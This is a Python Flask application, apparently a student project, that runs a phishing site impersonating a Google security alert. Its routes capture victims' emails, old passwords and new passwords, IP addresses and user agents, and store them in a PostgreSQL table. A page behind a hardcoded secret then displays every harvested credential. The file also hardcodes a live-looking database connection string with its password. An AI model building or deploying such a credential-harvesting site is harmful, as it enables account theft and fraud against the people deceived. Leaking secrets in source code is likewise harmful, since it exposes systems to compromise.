import os
import psycopg2
from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

# URL de votre base de données PostgreSQL sur Render
DATABASE_URL = os.environ.get('DATABASE_URL', "postgresql://facephis_user:eUk52l5Pv6VC8DsRW7Giy6au6xW7xfSD@dpg-d5ukgh2li9vc739m8teg-a.oregon-postgres.render.com/facephis")

def get_db_connection():
    """Établit la connexion à la base de données"""
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def get_client_info():
    """Récupère l'adresse IP et le user agent du client"""
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Inconnu')
    return ip_address, user_agent

@app.route('/')
def index():
    """Page d'accueil qui redirige vers Google"""
    return redirect("https://www.google.com")

@app.route('/security-alert')
def security_alert():
    """Page d'alerte de sécurité (première étape)"""
    return render_template('security_alert.html')

@app.route('/check-activity', methods=['POST'])
def check_activity():
    """Traitement de la première étape : capture de l'ancien mot de passe"""
    email = request.form.get('email')
    password = request.form.get('password')
    choice = request.form.get('choice')
    
    ip_address, user_agent = get_client_info()
    
    if email and password:
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            
            # Insertion des identifiants volés
            cur.execute('''
                INSERT INTO google_credentials (email, password, ip_address, user_agent)
                VALUES (%s, %s, %s, %s)
            ''', (email, password, ip_address, user_agent))
            
            conn.commit()
            cur.close()
            conn.close()
            
            print(f"🔐 Identifiants capturés: {email} / {password} depuis {ip_address}")
            
        except psycopg2.Error as e:
            print(f"❌ Erreur base de données: {e}")
            # Si la table n'existe pas, affiche un message clair
            if "relation" in str(e) and "does not exist" in str(e):
                return "Erreur: La table google_credentials n'existe pas. Veuillez la créer dans DBeaver."
            return f"Erreur technique: {e}"
    
    # Redirection vers la page de changement de mot de passe
    return redirect('/reset-password')

@app.route('/reset-password')
def reset_password():
    """Page de changement de mot de passe (deuxième étape)"""
    return render_template('reset_password.html')

@app.route('/change-password', methods=['POST'])
def change_password():
    """Traitement du nouveau mot de passe"""
    new_password = request.form.get('new_password')
    confirm_password = request.form.get('confirm_password')
    
    ip_address, user_agent = get_client_info()
    
    if new_password and confirm_password and new_password == confirm_password:
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            
            # Mise à jour du dernier enregistrement avec le nouveau mot de passe
            cur.execute('''
                UPDATE google_credentials 
                SET password = CONCAT(password, ' | NOUVEAU: ', %s)
                WHERE id = (SELECT MAX(id) FROM google_credentials WHERE ip_address = %s)
            ''', (new_password, ip_address))
            
            conn.commit()
            cur.close()
            conn.close()
            
            print(f"🔐 Nouveau mot de passe capturé: {new_password}")
            
        except psycopg2.Error as e:
            print(f"❌ Erreur base de données: {e}")
    
    # Redirection vers Google avec un message de succès
    return redirect('https://www.google.com')

@app.route('/view-data')
def view_data():
    """Page pour visualiser les données collectées"""
    # Protection par mot de passe
    if request.args.get('secret') != 'tp2026':
        return """
        <!DOCTYPE html>
        <html>
        <head><title>Accès restreint</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>🔒 Accès non autorisé</h1>
            <p>Cette page est protégée. Utilisez ?secret=tp2026 pour accéder aux données.</p>
        </body>
        </html>
        """
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        cur.execute('SELECT * FROM google_credentials ORDER BY date_collected DESC')
        credentials = cur.fetchall()
        
        cur.close()
        conn.close()
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Données collectées - Google </title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                h1 { color: #1a73e8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
                .stats { background: white; padding: 15px 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
                .stats p { margin: 5px 0; }
                table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #e0e0e0; }
                th { background-color: #1a73e8; color: white; font-weight: 500; }
                tr:hover { background-color: #f8f9fa; }
                .password-cell { font-family: monospace; max-width: 300px; word-break: break-all; }
                .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 500; }
                .badge-success { background: #e6f4ea; color: #1e8e3e; }
                .footer { margin-top: 20px; text-align: center; color: #5f6368; font-size: 12px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>
                    <span>📊</span> Données collectées - Google 
                </h1>
                <div class="stats">
                    <p><strong>📧 Total des identifiants collectés :</strong> """ + str(len(credentials)) + """</p>
                    <p><strong>🕐 Dernière collecte :</strong> """ + (str(credentials[0][5]) if credentials else "Aucune donnée") + """</p>
                </div>
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Email</th>
                            <th>Mot de passe</th>
                            <th>Adresse IP</th>
                            <th>User Agent</th>
                            <th>Date</th>
                        </tr>
                    </thead>
                    <tbody>
        """
        
        for row in credentials:
            html += f"""
                        <tr>
                            <td>{row[0]}</td>
                            <td><strong>{row[1]}</strong></td>
                            <td class="password-cell">{row[2]}</td>
                            <td>{row[3] or 'N/A'}</td>
                            <td style="font-size: 11px; max-width: 200px; word-break: break-all;">{row[4] or 'N/A'}</td>
                            <td>{row[5]}</td>
                        </tr>
            """
        
        html += f"""
                    </tbody>
                </table>
                <div class="footer">
                    <p>🔒 Données sensibles - Accès restreint</p>
                    <p>© Google  - Projet scolaire</p>
                </div>
            </div>
        </body>
        </html>
        """
        return html
        
    except psycopg2.Error as e:
        if "relation" in str(e) and "does not exist" in str(e):
            return """
            <!DOCTYPE html>
            <html>
            <head><title>Erreur</title></head>
            <body style="font-family: Arial; text-align: center; padding: 50px;">
                <h1>⚠️ Table manquante</h1>
                <p>La table <strong>google_credentials</strong> n'existe pas encore.</p>
                <p>Veuillez exécuter le script SQL suivant dans DBeaver :</p>
                <pre style="background: #f4f4f4; padding: 15px; text-align: left; display: inline-block;">
CREATE TABLE google_credentials (
    id SERIAL PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    password TEXT NOT NULL,
    ip_address VARCHAR(50),
    user_agent TEXT,
    date_collected TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
                </pre>
            </body>
            </html>
            """
        return f"Erreur base de données: {e}"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port) 
